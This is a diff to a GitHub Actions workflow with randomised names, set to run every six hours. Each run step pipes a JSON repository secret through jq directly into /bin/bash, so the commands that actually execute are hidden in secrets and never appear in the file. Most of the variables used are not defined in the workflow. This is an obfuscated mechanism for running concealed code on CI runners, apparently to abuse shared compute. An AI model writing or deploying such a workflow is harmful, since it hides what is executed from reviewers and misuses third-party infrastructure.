@@ -3,22 +3,23 @@ name: oushiyangg
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 4/6 * * *'
-jobs:  # 11281
+    - cron: '51 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: oushiyangg
         env:
-          ufp81863: ${{ secrets.ufp81863 }}
+          rpou1776: ${{ secrets.rpou1776 }}
         run: |
-          echo $ufp81863 | jq -r .hf639 | /bin/bash
-          echo $drltf13 | jq -r .n8 | /bin/bash
-          echo $izm911 | jq -r .hpox103 | /bin/bash
-          echo $mohk0 | jq -r .od840 | /bin/bash
-          echo $v9380 | jq -r .qxf448 | /bin/bash
-          echo $ea3 | jq -r .olumc5078 | /bin/bash
-          echo $tc12119 | jq -r .rt6422 | /bin/bash
-          echo $r94 | jq -r .rx2664 | /bin/bash
+          echo $rpou1776 | jq -r .rqy6471 | /bin/bash
+          echo $rwx7077 | jq -r .saqu35488 | /bin/bash
+          echo $twtpv79 | jq -r .q70897 | /bin/bash
+          echo $moh597 | jq -r .ikx84574 | /bin/bash
+          echo $p4 | jq -r .crr6889 | /bin/bash
+          echo $eugy405 | jq -r .egva7888 | /bin/bash
+          echo $k217 | jq -r .eoanj233 | /bin/bash
 
